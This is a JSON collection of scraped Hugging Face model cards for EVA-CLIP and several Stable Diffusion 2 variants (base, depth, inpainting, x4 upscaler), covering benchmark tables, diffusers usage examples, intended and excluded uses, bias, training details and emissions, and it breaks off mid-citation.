{
    "QuanSun/EVA-CLIP": "Summary of EVA-CLIP performance\nModel Card\nEVA-01-CLIP Series (MIM teacher: OpenAI CLIP-Large)\nEVA-02-CLIP Series (MIM teacher: EVA01_CLIP_g_14_psz14_s11B)\nPretrained\nhttps://github.com/baaivision/EVA/tree/master/EVA-CLIP\nSummary of EVA-CLIP performance\nModel Card\nEVA-01-CLIP Series (MIM teacher: OpenAI CLIP-Large)\nmodel name\ntotal #params\ntraining precision\ntraining data\ntraining batch size\ngpus for training\nIN-1K zero-shot top-1\nMSCOCO T2I R@5\nweight\nEVA01_CLIP_g_14_psz14_s11B\n1.1B\nfp16\nLAION-400M\n41K\n256 A100(40GB)\n78.5\n68.5\nü§ó HF link (2.2GB)\nEVA01_CLIP_g_14_plus_psz14_s11B\n1.3B\nfp16\nMerged-2B\n114K\n112 A100(40GB)\n79.3\n74.0\nü§ó HF link (2.7GB)\nEVA-02-CLIP Series (MIM teacher: EVA01_CLIP_g_14_psz14_s11B)\nmodel name\nimage enc. init. ckpt\ntext enc. init. ckpt\ntotal #params\ntraining precision\ntraining data\ntraining batch size\ngpus for training\nIN-1K zero-shot top-1\nMSCOCO T2I R@5\nweight\nEVA02_CLIP_B_psz16_s8B\nEVA02_B_psz14to16\nopenai/clip-vit-base-patch16\n149M\nfp16\nMerged-2B\n131K\n64 A100(40GB)\n74.7\n66.9\nü§ó HF link (300MB)\nEVA02_CLIP_L_psz14_s4B\nEVA02_L_psz14\nopenai/clip-vit-large-patch14\n428M\nfp16\nMerged-2B\n131K\n128 A100(40GB)\n79.8\n71.2\nü§ó HF link (856MB)\nEVA02_CLIP_L_336_psz14_s6B\nEVA02_CLIP_L_psz14_224to336\nEVA02_CLIP_L_psz14_224to336\n428M\nfp16\nMerged-2B\n61K\n128 A100(40GB)\n80.4\n71.7\nü§ó HF link (856MB)\nEVA02_CLIP_E_psz14_s4B.pt\nEVA02_E_psz14\nlaion/CLIP-ViT-H-14-laion2B-s32B-b79K\n4.7B\nfp16\nLAION-2B\n115K\n144 A100(80GB)\n81.9\n74.7\nü§ó HF link (9.4GB)\nEVA02_CLIP_E_psz14_plus_s9B.pt\nEVA02_E_psz14\nlaion/CLIP-ViT-bigG-14-laion2B-39B-b160k\n5.0B\nbf16\nLAION-2B\n144K\n144 A100(80GB)\n82.0\n75.0\nü§ó HF link (10.1GB)\nTo construct Merged-2B, we merged 1.6 billion samples from LAION-2B dataset with 0.4 billion samples from COYO-700M.\nTo our knowledge, EVA-CLIP series are the most performant open-sourced CLIP models at all scales, evaluated via zero-shot classification performance, especially on mainstream classification benchmarks such as ImageNet along with its variants.\nFor more details about EVA-CLIP, please refer to our paper.\nPretrained\nmodel name\ntotal #params\ntraining precision\ndownload link\nEVA01_g_psz14\n1.0B\nfp16\nü§ó HF link (2.0GB)\nEVA02_B_psz14to16\n86M\nfp16\nü§ó HF link (176MB)\nEVA02_L_psz14\n304M\nfp16\nü§ó HF link (609MB)\nEVA02_CLIP_L_psz14_224to336\n428M\nfp16\nü§ó HF link (857MB)\nEVA02_E_psz14\n4.4B\nfp16\nü§ó HF link (8.7GB)\nopenai/clip-vit-base-patch16\n149M\nfp16\nü§ó HF link (599MB)\nopenai/clip-vit-large-patch14\n428M\nfp16\nü§ó HF link (1.7GB)\nlaion/CLIP-ViT-H-14-laion2B-s32B-b79K\n1.0B\nbf16\nü§ó HF link (3.9GB)\nlaion/CLIP-ViT-bigG-14-laion2B-39B-b160k\n1.8B\nbf16\nü§ó HF link part1 part2(9.9GB+169M)\nEVA02_B_psz14to16 interpolates the kernel size of patch_embed from 14x14 to 16x16, and interpolate the pos_embed from 16x16 to 14x14.\nEVA02_CLIP_L_psz14_224to336 interpolates the pos_embed from 16x16 to 24x24 for training EVA02_CLIP_L_336_psz14_s6B.\nlaion/CLIP-ViT-bigG-14-laion2B-39B-b160k consists of 2 parts of weights, part1 and part2.",
    "stabilityai/stable-diffusion-2-base": "Stable Diffusion v2-base Model Card\nModel Details\nExamples\nUses\nDirect Use\nMisuse, Malicious Use, and Out-of-Scope Use\nLimitations and Bias\nLimitations\nBias\nTraining\nEvaluation Results\nEnvironmental Impact\nCitation\nStable Diffusion v2-base Model Card\nThis model card focuses on the model associated with the Stable Diffusion v2-base model, available here.\nThe model is trained from scratch 550k steps at resolution 256x256 on a subset of LAION-5B filtered for explicit pornographic material, using the LAION-NSFW classifier with punsafe=0.1 and an aesthetic score >= 4.5. Then it is further trained for 850k steps at resolution 512x512 on the same dataset on images with resolution >= 512x512.\nUse it with the stablediffusion repository: download the 512-base-ema.ckpt here.\nUse it with üß® diffusers\nModel Details\nDeveloped by: Robin Rombach, Patrick Esser\nModel type: Diffusion-based text-to-image generation model\nLanguage(s): English\nLicense: CreativeML Open RAIL++-M License\nModel Description: This is a model that can be used to generate and modify images based on text prompts. It is a Latent Diffusion Model that uses a fixed, pretrained text encoder (OpenCLIP-ViT/H).\nResources for more information: GitHub Repository.\nCite as:\n@InProceedings{Rombach_2022_CVPR,\nauthor    = {Rombach, Robin and Blattmann, Andreas and Lorenz, Dominik and Esser, Patrick and Ommer, Bj\\\"orn},\ntitle     = {High-Resolution Image Synthesis With Latent Diffusion Models},\nbooktitle = {Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR)},\nmonth     = {June},\nyear      = {2022},\npages     = {10684-10695}\n}\nExamples\nUsing the ü§ó's Diffusers library to run Stable Diffusion 2 in a simple and efficient manner.\npip install diffusers transformers accelerate scipy safetensors\nRunning the pipeline (if you don't swap the scheduler it will run with the default PNDM/PLMS scheduler, in this example we are swapping it to EulerDiscreteScheduler):\nfrom diffusers import StableDiffusionPipeline, EulerDiscreteScheduler\nimport torch\nmodel_id = \"stabilityai/stable-diffusion-2-base\"\n# Use the Euler scheduler here instead\nscheduler = EulerDiscreteScheduler.from_pretrained(model_id, subfolder=\"scheduler\")\npipe = StableDiffusionPipeline.from_pretrained(model_id, scheduler=scheduler, torch_dtype=torch.float16)\npipe = pipe.to(\"cuda\")\nprompt = \"a photo of an astronaut riding a horse on mars\"\nimage = pipe(prompt).images[0]\nimage.save(\"astronaut_rides_horse.png\")\nNotes:\nDespite not being a dependency, we highly recommend you to install xformers for memory efficient attention (better performance)\nIf you have low GPU RAM available, make sure to add a pipe.enable_attention_slicing() after sending it to cuda for less VRAM usage (to the cost of speed)\nUses\nDirect Use\nThe model is intended for research purposes only. Possible research areas and tasks include\nSafe deployment of models which have the potential to generate harmful content.\nProbing and understanding the limitations and biases of generative models.\nGeneration of artworks and use in design and other artistic processes.\nApplications in educational or creative tools.\nResearch on generative models.\nExcluded uses are described below.\nMisuse, Malicious Use, and Out-of-Scope Use\nNote: This section is originally taken from the DALLE-MINI model card, was used for Stable Diffusion v1, but applies in the same way to Stable Diffusion v2.\nThe model should not be used to intentionally create or disseminate images that create hostile or alienating environments for people. This includes generating images that people would foreseeably find disturbing, distressing, or offensive; or content that propagates historical or current stereotypes.\nOut-of-Scope Use\nThe model was not trained to be factual or true representations of people or events, and therefore using the model to generate such content is out-of-scope for the abilities of this model.\nMisuse and Malicious Use\nUsing the model to generate content that is cruel to individuals is a misuse of this model. This includes, but is not limited to:\nGenerating demeaning, dehumanizing, or otherwise harmful representations of people or their environments, cultures, religions, etc.\nIntentionally promoting or propagating discriminatory content or harmful stereotypes.\nImpersonating individuals without their consent.\nSexual content without consent of the people who might see it.\nMis- and disinformation\nRepresentations of egregious violence and gore\nSharing of copyrighted or licensed material in violation of its terms of use.\nSharing content that is an alteration of copyrighted or licensed material in violation of its terms of use.\nLimitations and Bias\nLimitations\nThe model does not achieve perfect photorealism\nThe model cannot render legible text\nThe model does not perform well on more difficult tasks which involve compositionality, such as rendering an image corresponding to ‚ÄúA red cube on top of a blue sphere‚Äù\nFaces and people in general may not be generated properly.\nThe model was trained mainly with English captions and will not work as well in other languages.\nThe autoencoding part of the model is lossy\nThe model was trained on a subset of the large-scale dataset\nLAION-5B, which contains adult, violent and sexual content. To partially mitigate this, we have filtered the dataset using LAION's NFSW detector (see Training section).\nBias\nWhile the capabilities of image generation models are impressive, they can also reinforce or exacerbate social biases.\nStable Diffusion vw was primarily trained on subsets of LAION-2B(en),\nwhich consists of images that are limited to English descriptions.\nTexts and images from communities and cultures that use other languages are likely to be insufficiently accounted for.\nThis affects the overall output of the model, as white and western cultures are often set as the default. Further, the\nability of the model to generate content with non-English prompts is significantly worse than with English-language prompts.\nStable Diffusion v2 mirrors and exacerbates biases to such a degree that viewer discretion must be advised irrespective of the input or its intent.\nTraining\nTraining Data\nThe model developers used the following dataset for training the model:\nLAION-5B and subsets (details below). The training data is further filtered using LAION's NSFW detector, with a \"p_unsafe\" score of 0.1 (conservative). For more details, please refer to LAION-5B's NeurIPS 2022 paper and reviewer discussions on the topic.\nTraining Procedure\nStable Diffusion v2 is a latent diffusion model which combines an autoencoder with a diffusion model that is trained in the latent space of the autoencoder. During training,\nImages are encoded through an encoder, which turns images into latent representations. The autoencoder uses a relative downsampling factor of 8 and maps images of shape H x W x 3 to latents of shape H/f x W/f x 4\nText prompts are encoded through the OpenCLIP-ViT/H text-encoder.\nThe output of the text encoder is fed into the UNet backbone of the latent diffusion model via cross-attention.\nThe loss is a reconstruction objective between the noise that was added to the latent and the prediction made by the UNet. We also use the so-called v-objective, see https://arxiv.org/abs/2202.00512.\nWe currently provide the following checkpoints:\n512-base-ema.ckpt: 550k steps at resolution 256x256 on a subset of LAION-5B filtered for explicit pornographic material, using the LAION-NSFW classifier with punsafe=0.1 and an aesthetic score >= 4.5.\n850k steps at resolution 512x512 on the same dataset with resolution >= 512x512.\n768-v-ema.ckpt: Resumed from 512-base-ema.ckpt and trained for 150k steps using a v-objective on the same dataset. Resumed for another 140k steps on a 768x768 subset of our dataset.\n512-depth-ema.ckpt: Resumed from 512-base-ema.ckpt and finetuned for 200k steps. Added an extra input channel to process the (relative) depth prediction produced by MiDaS (dpt_hybrid) which is used as an additional conditioning.\nThe additional input channels of the U-Net which process this extra information were zero-initialized.\n512-inpainting-ema.ckpt: Resumed from 512-base-ema.ckpt and trained for another 200k steps. Follows the mask-generation strategy presented in LAMA which, in combination with the latent VAE representations of the masked image, are used as an additional conditioning.\nThe additional input channels of the U-Net which process this extra information were zero-initialized. The same strategy was used to train the 1.5-inpainting checkpoint.\nx4-upscaling-ema.ckpt: Trained for 1.25M steps on a 10M subset of LAION containing images >2048x2048. The model was trained on crops of size 512x512 and is a text-guided latent upscaling diffusion model.\nIn addition to the textual input, it receives a noise_level as an input parameter, which can be used to add noise to the low-resolution input according to a predefined diffusion schedule.\nHardware: 32 x 8 x A100 GPUs\nOptimizer: AdamW\nGradient Accumulations: 1\nBatch: 32 x 8 x 2 x 4 = 2048\nLearning rate: warmup to 0.0001 for 10,000 steps and then kept constant\nEvaluation Results\nEvaluations with different classifier-free guidance scales (1.5, 2.0, 3.0, 4.0,\n5.0, 6.0, 7.0, 8.0) and 50 steps DDIM sampling steps show the relative improvements of the checkpoints:\nEvaluated using 50 DDIM steps and 10000 random prompts from the COCO2017 validation set, evaluated at 512x512 resolution.  Not optimized for FID scores.\nEnvironmental Impact\nStable Diffusion v1 Estimated Emissions\nBased on that information, we estimate the following CO2 emissions using the Machine Learning Impact calculator presented in Lacoste et al. (2019). The hardware, runtime, cloud provider, and compute region were utilized to estimate the carbon impact.\nHardware Type: A100 PCIe 40GB\nHours used: 200000\nCloud Provider: AWS\nCompute Region: US-east\nCarbon Emitted (Power consumption x Time x Carbon produced based on location of power grid): 15000 kg CO2 eq.\nCitation\n@InProceedings{Rombach_2022_CVPR,\nauthor    = {Rombach, Robin and Blattmann, Andreas and Lorenz, Dominik and Esser, Patrick and Ommer, Bj\\\"orn},\ntitle     = {High-Resolution Image Synthesis With Latent Diffusion Models},\nbooktitle = {Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR)},\nmonth     = {June},\nyear      = {2022},\npages     = {10684-10695}\n}\nThis model card was written by: Robin Rombach, Patrick Esser and David Ha and is based on the Stable Diffusion v1 and DALL-E Mini model card.",
    "stabilityai/stable-diffusion-2-depth": "Stable Diffusion v2 Model Card\nModel Details\nExamples\nUses\nDirect Use\nMisuse, Malicious Use, and Out-of-Scope Use\nLimitations and Bias\nLimitations\nBias\nTraining\nEvaluation Results\nEnvironmental Impact\nCitation\nStable Diffusion v2 Model Card\nThis model card focuses on the model associated with the Stable Diffusion v2 model, available here.\nThis stable-diffusion-2-depth model is resumed from stable-diffusion-2-base (512-base-ema.ckpt) and finetuned for 200k steps. Added an extra input channel to process the (relative) depth prediction produced by MiDaS (dpt_hybrid) which is used as an additional conditioning.\nUse it with the stablediffusion repository: download the 512-depth-ema.ckpt here.\nUse it with üß® diffusers\nModel Details\nDeveloped by: Robin Rombach, Patrick Esser\nModel type: Diffusion-based text-to-image generation model\nLanguage(s): English\nLicense: CreativeML Open RAIL++-M License\nModel Description: This is a model that can be used to generate and modify images based on text prompts. It is a Latent Diffusion Model that uses a fixed, pretrained text encoder (OpenCLIP-ViT/H).\nResources for more information: GitHub Repository.\nCite as:\n@InProceedings{Rombach_2022_CVPR,\nauthor    = {Rombach, Robin and Blattmann, Andreas and Lorenz, Dominik and Esser, Patrick and Ommer, Bj\\\"orn},\ntitle     = {High-Resolution Image Synthesis With Latent Diffusion Models},\nbooktitle = {Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR)},\nmonth     = {June},\nyear      = {2022},\npages     = {10684-10695}\n}\nExamples\nUsing the ü§ó's Diffusers library to run Stable Diffusion 2 in a simple and efficient manner.\npip install -U git+https://github.com/huggingface/transformers.git\npip install diffusers transformers accelerate scipy safetensors\nRunning the pipeline (if you don't swap the scheduler it will run with the default DDIM, in this example we are swapping it to EulerDiscreteScheduler):\nimport torch\nimport requests\nfrom PIL import Image\nfrom diffusers import StableDiffusionDepth2ImgPipeline\npipe = StableDiffusionDepth2ImgPipeline.from_pretrained(\n\"stabilityai/stable-diffusion-2-depth\",\ntorch_dtype=torch.float16,\n).to(\"cuda\")\nurl = \"http://images.cocodataset.org/val2017/000000039769.jpg\"\ninit_image = Image.open(requests.get(url, stream=True).raw)\nprompt = \"two tigers\"\nn_propmt = \"bad, deformed, ugly, bad anotomy\"\nimage = pipe(prompt=prompt, image=init_image, negative_prompt=n_propmt, strength=0.7).images[0]\nNotes:\nDespite not being a dependency, we highly recommend you to install xformers for memory efficient attention (better performance)\nIf you have low GPU RAM available, make sure to add a pipe.enable_attention_slicing() after sending it to cuda for less VRAM usage (to the cost of speed)\nUses\nDirect Use\nThe model is intended for research purposes only. Possible research areas and tasks include\nSafe deployment of models which have the potential to generate harmful content.\nProbing and understanding the limitations and biases of generative models.\nGeneration of artworks and use in design and other artistic processes.\nApplications in educational or creative tools.\nResearch on generative models.\nExcluded uses are described below.\nMisuse, Malicious Use, and Out-of-Scope Use\nNote: This section is originally taken from the DALLE-MINI model card, was used for Stable Diffusion v1, but applies in the same way to Stable Diffusion v2.\nThe model should not be used to intentionally create or disseminate images that create hostile or alienating environments for people. This includes generating images that people would foreseeably find disturbing, distressing, or offensive; or content that propagates historical or current stereotypes.\nOut-of-Scope Use\nThe model was not trained to be factual or true representations of people or events, and therefore using the model to generate such content is out-of-scope for the abilities of this model.\nMisuse and Malicious Use\nUsing the model to generate content that is cruel to individuals is a misuse of this model. This includes, but is not limited to:\nGenerating demeaning, dehumanizing, or otherwise harmful representations of people or their environments, cultures, religions, etc.\nIntentionally promoting or propagating discriminatory content or harmful stereotypes.\nImpersonating individuals without their consent.\nSexual content without consent of the people who might see it.\nMis- and disinformation\nRepresentations of egregious violence and gore\nSharing of copyrighted or licensed material in violation of its terms of use.\nSharing content that is an alteration of copyrighted or licensed material in violation of its terms of use.\nLimitations and Bias\nLimitations\nThe model does not achieve perfect photorealism\nThe model cannot render legible text\nThe model does not perform well on more difficult tasks which involve compositionality, such as rendering an image corresponding to ‚ÄúA red cube on top of a blue sphere‚Äù\nFaces and people in general may not be generated properly.\nThe model was trained mainly with English captions and will not work as well in other languages.\nThe autoencoding part of the model is lossy\nThe model was trained on a subset of the large-scale dataset\nLAION-5B, which contains adult, violent and sexual content. To partially mitigate this, we have filtered the dataset using LAION's NFSW detector (see Training section).\nBias\nWhile the capabilities of image generation models are impressive, they can also reinforce or exacerbate social biases.\nStable Diffusion vw was primarily trained on subsets of LAION-2B(en),\nwhich consists of images that are limited to English descriptions.\nTexts and images from communities and cultures that use other languages are likely to be insufficiently accounted for.\nThis affects the overall output of the model, as white and western cultures are often set as the default. Further, the\nability of the model to generate content with non-English prompts is significantly worse than with English-language prompts.\nStable Diffusion v2 mirrors and exacerbates biases to such a degree that viewer discretion must be advised irrespective of the input or its intent.\nTraining\nTraining Data\nThe model developers used the following dataset for training the model:\nLAION-5B and subsets (details below). The training data is further filtered using LAION's NSFW detector, with a \"p_unsafe\" score of 0.1 (conservative). For more details, please refer to LAION-5B's NeurIPS 2022 paper and reviewer discussions on the topic.\nTraining Procedure\nStable Diffusion v2 is a latent diffusion model which combines an autoencoder with a diffusion model that is trained in the latent space of the autoencoder. During training,\nImages are encoded through an encoder, which turns images into latent representations. The autoencoder uses a relative downsampling factor of 8 and maps images of shape H x W x 3 to latents of shape H/f x W/f x 4\nText prompts are encoded through the OpenCLIP-ViT/H text-encoder.\nThe output of the text encoder is fed into the UNet backbone of the latent diffusion model via cross-attention.\nThe loss is a reconstruction objective between the noise that was added to the latent and the prediction made by the UNet. We also use the so-called v-objective, see https://arxiv.org/abs/2202.00512.\nWe currently provide the following checkpoints:\n512-base-ema.ckpt: 550k steps at resolution 256x256 on a subset of LAION-5B filtered for explicit pornographic material, using the LAION-NSFW classifier with punsafe=0.1 and an aesthetic score >= 4.5.\n850k steps at resolution 512x512 on the same dataset with resolution >= 512x512.\n768-v-ema.ckpt: Resumed from 512-base-ema.ckpt and trained for 150k steps using a v-objective on the same dataset. Resumed for another 140k steps on a 768x768 subset of our dataset.\n512-depth-ema.ckpt: Resumed from 512-base-ema.ckpt and finetuned for 200k steps. Added an extra input channel to process the (relative) depth prediction produced by MiDaS (dpt_hybrid) which is used as an additional conditioning.\nThe additional input channels of the U-Net which process this extra information were zero-initialized.\n512-inpainting-ema.ckpt: Resumed from 512-base-ema.ckpt and trained for another 200k steps. Follows the mask-generation strategy presented in LAMA which, in combination with the latent VAE representations of the masked image, are used as an additional conditioning.\nThe additional input channels of the U-Net which process this extra information were zero-initialized. The same strategy was used to train the 1.5-inpainting checkpoint.\nx4-upscaling-ema.ckpt: Trained for 1.25M steps on a 10M subset of LAION containing images >2048x2048. The model was trained on crops of size 512x512 and is a text-guided latent upscaling diffusion model.\nIn addition to the textual input, it receives a noise_level as an input parameter, which can be used to add noise to the low-resolution input according to a predefined diffusion schedule.\nHardware: 32 x 8 x A100 GPUs\nOptimizer: AdamW\nGradient Accumulations: 1\nBatch: 32 x 8 x 2 x 4 = 2048\nLearning rate: warmup to 0.0001 for 10,000 steps and then kept constant\nEvaluation Results\nEvaluations with different classifier-free guidance scales (1.5, 2.0, 3.0, 4.0,\n5.0, 6.0, 7.0, 8.0) and 50 steps DDIM sampling steps show the relative improvements of the checkpoints:\nEvaluated using 50 DDIM steps and 10000 random prompts from the COCO2017 validation set, evaluated at 512x512 resolution.  Not optimized for FID scores.\nEnvironmental Impact\nStable Diffusion v1 Estimated Emissions\nBased on that information, we estimate the following CO2 emissions using the Machine Learning Impact calculator presented in Lacoste et al. (2019). The hardware, runtime, cloud provider, and compute region were utilized to estimate the carbon impact.\nHardware Type: A100 PCIe 40GB\nHours used: 200000\nCloud Provider: AWS\nCompute Region: US-east\nCarbon Emitted (Power consumption x Time x Carbon produced based on location of power grid): 15000 kg CO2 eq.\nCitation\n@InProceedings{Rombach_2022_CVPR,\nauthor    = {Rombach, Robin and Blattmann, Andreas and Lorenz, Dominik and Esser, Patrick and Ommer, Bj\\\"orn},\ntitle     = {High-Resolution Image Synthesis With Latent Diffusion Models},\nbooktitle = {Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR)},\nmonth     = {June},\nyear      = {2022},\npages     = {10684-10695}\n}\nThis model card was written by: Robin Rombach, Patrick Esser and David Ha and is based on the Stable Diffusion v1 and DALL-E Mini model card.",
    "stabilityai/stable-diffusion-2-inpainting": "Stable Diffusion v2 Model Card\nModel Details\nExamples\nUses\nDirect Use\nMisuse, Malicious Use, and Out-of-Scope Use\nLimitations and Bias\nLimitations\nBias\nTraining\nEvaluation Results\nEnvironmental Impact\nCitation\nStable Diffusion v2 Model Card\nThis model card focuses on the model associated with the Stable Diffusion v2, available here.\nThis stable-diffusion-2-inpainting model is resumed from stable-diffusion-2-base (512-base-ema.ckpt) and trained for another 200k steps. Follows the mask-generation strategy presented in LAMA which, in combination with the latent VAE representations of the masked image, are used as an additional conditioning.\nUse it with the stablediffusion repository: download the 512-inpainting-ema.ckpt here.\nUse it with üß® diffusers\nModel Details\nDeveloped by: Robin Rombach, Patrick Esser\nModel type: Diffusion-based text-to-image generation model\nLanguage(s): English\nLicense: CreativeML Open RAIL++-M License\nModel Description: This is a model that can be used to generate and modify images based on text prompts. It is a Latent Diffusion Model that uses a fixed, pretrained text encoder (OpenCLIP-ViT/H).\nResources for more information: GitHub Repository.\nCite as:\n@InProceedings{Rombach_2022_CVPR,\nauthor    = {Rombach, Robin and Blattmann, Andreas and Lorenz, Dominik and Esser, Patrick and Ommer, Bj\\\"orn},\ntitle     = {High-Resolution Image Synthesis With Latent Diffusion Models},\nbooktitle = {Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR)},\nmonth     = {June},\nyear      = {2022},\npages     = {10684-10695}\n}\nExamples\nUsing the ü§ó's Diffusers library to run Stable Diffusion 2 inpainting in a simple and efficient manner.\npip install diffusers transformers accelerate scipy safetensors\nfrom diffusers import StableDiffusionInpaintPipeline\npipe = StableDiffusionInpaintPipeline.from_pretrained(\n\"stabilityai/stable-diffusion-2-inpainting\",\ntorch_dtype=torch.float16,\n)\npipe.to(\"cuda\")\nprompt = \"Face of a yellow cat, high resolution, sitting on a park bench\"\n#image and mask_image should be PIL images.\n#The mask structure is white for inpainting and black for keeping as is\nimage = pipe(prompt=prompt, image=image, mask_image=mask_image).images[0]\nimage.save(\"./yellow_cat_on_park_bench.png\")\nNotes:\nDespite not being a dependency, we highly recommend you to install xformers for memory efficient attention (better performance)\nIf you have low GPU RAM available, make sure to add a pipe.enable_attention_slicing() after sending it to cuda for less VRAM usage (to the cost of speed)\nHow it works:\nimage\nmask_image\nprompt\nOutput\nFace of a yellow cat, high resolution, sitting on a park bench\nUses\nDirect Use\nThe model is intended for research purposes only. Possible research areas and tasks include\nSafe deployment of models which have the potential to generate harmful content.\nProbing and understanding the limitations and biases of generative models.\nGeneration of artworks and use in design and other artistic processes.\nApplications in educational or creative tools.\nResearch on generative models.\nExcluded uses are described below.\nMisuse, Malicious Use, and Out-of-Scope Use\nNote: This section is originally taken from the DALLE-MINI model card, was used for Stable Diffusion v1, but applies in the same way to Stable Diffusion v2.\nThe model should not be used to intentionally create or disseminate images that create hostile or alienating environments for people. This includes generating images that people would foreseeably find disturbing, distressing, or offensive; or content that propagates historical or current stereotypes.\nOut-of-Scope Use\nThe model was not trained to be factual or true representations of people or events, and therefore using the model to generate such content is out-of-scope for the abilities of this model.\nMisuse and Malicious Use\nUsing the model to generate content that is cruel to individuals is a misuse of this model. This includes, but is not limited to:\nGenerating demeaning, dehumanizing, or otherwise harmful representations of people or their environments, cultures, religions, etc.\nIntentionally promoting or propagating discriminatory content or harmful stereotypes.\nImpersonating individuals without their consent.\nSexual content without consent of the people who might see it.\nMis- and disinformation\nRepresentations of egregious violence and gore\nSharing of copyrighted or licensed material in violation of its terms of use.\nSharing content that is an alteration of copyrighted or licensed material in violation of its terms of use.\nLimitations and Bias\nLimitations\nThe model does not achieve perfect photorealism\nThe model cannot render legible text\nThe model does not perform well on more difficult tasks which involve compositionality, such as rendering an image corresponding to ‚ÄúA red cube on top of a blue sphere‚Äù\nFaces and people in general may not be generated properly.\nThe model was trained mainly with English captions and will not work as well in other languages.\nThe autoencoding part of the model is lossy\nThe model was trained on a subset of the large-scale dataset\nLAION-5B, which contains adult, violent and sexual content. To partially mitigate this, we have filtered the dataset using LAION's NFSW detector (see Training section).\nBias\nWhile the capabilities of image generation models are impressive, they can also reinforce or exacerbate social biases.\nStable Diffusion vw was primarily trained on subsets of LAION-2B(en),\nwhich consists of images that are limited to English descriptions.\nTexts and images from communities and cultures that use other languages are likely to be insufficiently accounted for.\nThis affects the overall output of the model, as white and western cultures are often set as the default. Further, the\nability of the model to generate content with non-English prompts is significantly worse than with English-language prompts.\nStable Diffusion v2 mirrors and exacerbates biases to such a degree that viewer discretion must be advised irrespective of the input or its intent.\nTraining\nTraining Data\nThe model developers used the following dataset for training the model:\nLAION-5B and subsets (details below). The training data is further filtered using LAION's NSFW detector, with a \"p_unsafe\" score of 0.1 (conservative). For more details, please refer to LAION-5B's NeurIPS 2022 paper and reviewer discussions on the topic.\nTraining Procedure\nStable Diffusion v2 is a latent diffusion model which combines an autoencoder with a diffusion model that is trained in the latent space of the autoencoder. During training,\nImages are encoded through an encoder, which turns images into latent representations. The autoencoder uses a relative downsampling factor of 8 and maps images of shape H x W x 3 to latents of shape H/f x W/f x 4\nText prompts are encoded through the OpenCLIP-ViT/H text-encoder.\nThe output of the text encoder is fed into the UNet backbone of the latent diffusion model via cross-attention.\nThe loss is a reconstruction objective between the noise that was added to the latent and the prediction made by the UNet. We also use the so-called v-objective, see https://arxiv.org/abs/2202.00512.\nWe currently provide the following checkpoints:\n512-base-ema.ckpt: 550k steps at resolution 256x256 on a subset of LAION-5B filtered for explicit pornographic material, using the LAION-NSFW classifier with punsafe=0.1 and an aesthetic score >= 4.5.\n850k steps at resolution 512x512 on the same dataset with resolution >= 512x512.\n768-v-ema.ckpt: Resumed from 512-base-ema.ckpt and trained for 150k steps using a v-objective on the same dataset. Resumed for another 140k steps on a 768x768 subset of our dataset.\n512-depth-ema.ckpt: Resumed from 512-base-ema.ckpt and finetuned for 200k steps. Added an extra input channel to process the (relative) depth prediction produced by MiDaS (dpt_hybrid) which is used as an additional conditioning.\nThe additional input channels of the U-Net which process this extra information were zero-initialized.\n512-inpainting-ema.ckpt: Resumed from 512-base-ema.ckpt and trained for another 200k steps. Follows the mask-generation strategy presented in LAMA which, in combination with the latent VAE representations of the masked image, are used as an additional conditioning.\nThe additional input channels of the U-Net which process this extra information were zero-initialized. The same strategy was used to train the 1.5-inpainting checkpoint.\nx4-upscaling-ema.ckpt: Trained for 1.25M steps on a 10M subset of LAION containing images >2048x2048. The model was trained on crops of size 512x512 and is a text-guided latent upscaling diffusion model.\nIn addition to the textual input, it receives a noise_level as an input parameter, which can be used to add noise to the low-resolution input according to a predefined diffusion schedule.\nHardware: 32 x 8 x A100 GPUs\nOptimizer: AdamW\nGradient Accumulations: 1\nBatch: 32 x 8 x 2 x 4 = 2048\nLearning rate: warmup to 0.0001 for 10,000 steps and then kept constant\nEvaluation Results\nEvaluations with different classifier-free guidance scales (1.5, 2.0, 3.0, 4.0,\n5.0, 6.0, 7.0, 8.0) and 50 steps DDIM sampling steps show the relative improvements of the checkpoints:\nEvaluated using 50 DDIM steps and 10000 random prompts from the COCO2017 validation set, evaluated at 512x512 resolution.  Not optimized for FID scores.\nEnvironmental Impact\nStable Diffusion v1 Estimated Emissions\nBased on that information, we estimate the following CO2 emissions using the Machine Learning Impact calculator presented in Lacoste et al. (2019). The hardware, runtime, cloud provider, and compute region were utilized to estimate the carbon impact.\nHardware Type: A100 PCIe 40GB\nHours used: 200000\nCloud Provider: AWS\nCompute Region: US-east\nCarbon Emitted (Power consumption x Time x Carbon produced based on location of power grid): 15000 kg CO2 eq.\nCitation\n@InProceedings{Rombach_2022_CVPR,\nauthor    = {Rombach, Robin and Blattmann, Andreas and Lorenz, Dominik and Esser, Patrick and Ommer, Bj\\\"orn},\ntitle     = {High-Resolution Image Synthesis With Latent Diffusion Models},\nbooktitle = {Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR)},\nmonth     = {June},\nyear      = {2022},\npages     = {10684-10695}\n}\nThis model card was written by: Robin Rombach, Patrick Esser and David Ha and is based on the Stable Diffusion v1 and DALL-E Mini model card.",
    "stabilityai/stable-diffusion-x4-upscaler": "Stable Diffusion x4 upscaler model card\nModel Details\nExamples\nUses\nDirect Use\nMisuse, Malicious Use, and Out-of-Scope Use\nLimitations and Bias\nLimitations\nBias\nTraining\nEvaluation Results\nEnvironmental Impact\nCitation\nStable Diffusion x4 upscaler model card\nThis model card focuses on the model associated with the Stable Diffusion Upscaler, available here.\nThis model is trained for 1.25M steps on a 10M subset of LAION containing images >2048x2048. The model was trained on crops of size 512x512 and is a text-guided latent upscaling diffusion model.\nIn addition to the textual input, it receives a noise_level as an input parameter, which can be used to add noise to the low-resolution input according to a predefined diffusion schedule.\nUse it with the stablediffusion repository: download the x4-upscaler-ema.ckpt here.\nUse it with üß® diffusers\nModel Details\nDeveloped by: Robin Rombach, Patrick Esser\nModel type: Diffusion-based text-to-image generation model\nLanguage(s): English\nLicense: CreativeML Open RAIL++-M License\nModel Description: This is a model that can be used to generate and modify images based on text prompts. It is a Latent Diffusion Model that uses a fixed, pretrained text encoder (OpenCLIP-ViT/H).\nResources for more information: GitHub Repository.\nCite as:\n@InProceedings{Rombach_2022_CVPR,\nauthor    = {Rombach, Robin and Blattmann, Andreas and Lorenz, Dominik and Esser, Patrick and Ommer, Bj\\\"orn},\ntitle     = {High-Resolution Image Synthesis With Latent Diffusion Models},\nbooktitle = {Proceedings of the IEEE/CVF Conference on 